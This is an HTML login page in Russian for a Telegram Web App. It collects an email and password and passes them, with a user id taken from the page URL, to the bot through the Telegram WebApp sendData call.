<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Авторизация</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; max-width: 400px; margin: 0 auto; }
        .form-group { margin-bottom: 15px; }
        input { padding: 10px; width: 100%; box-sizing: border-box; border: 1px solid #ddd; }
        button { background: #2481cc; color: white; border: none; padding: 12px; width: 100%; cursor: pointer; }
        #status { margin-top: 15px; padding: 10px; text-align: center; }
    </style>
</head>
<body>
    <h2>Авторизация</h2>
    <form id="authForm">
        <div class="form-group">
            <label>Email:</label>
            <input type="email" id="email" required placeholder="Ваш email">
        </div>
        <div class="form-group">
            <label>Пароль:</label>
            <input type="password" id="password" required placeholder="Ваш пароль">
        </div>
        <button type="submit" id="submitBtn">Войти</button>
    </form>
    <div id="status"></div>

    <script>
        // Инициализация WebApp
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        document.getElementById('authForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const user_id = new URLSearchParams(window.location.search).get('user_id');
            
            // Проверка данных
            if (!email || !password) {
                document.getElementById('status').textContent = "Заполните все поля!";
                document.getElementById('status').style.color = "red";
                return;
            }
            
            // Отправка данных в Telegram бот
            const data = {
                action: "auth",
                email: email,
                password: password,
                telegram_id: user_id
            };
            
            tg.sendData(JSON.stringify(data));
            tg.close();
        });
    </script>
</body>
</html>
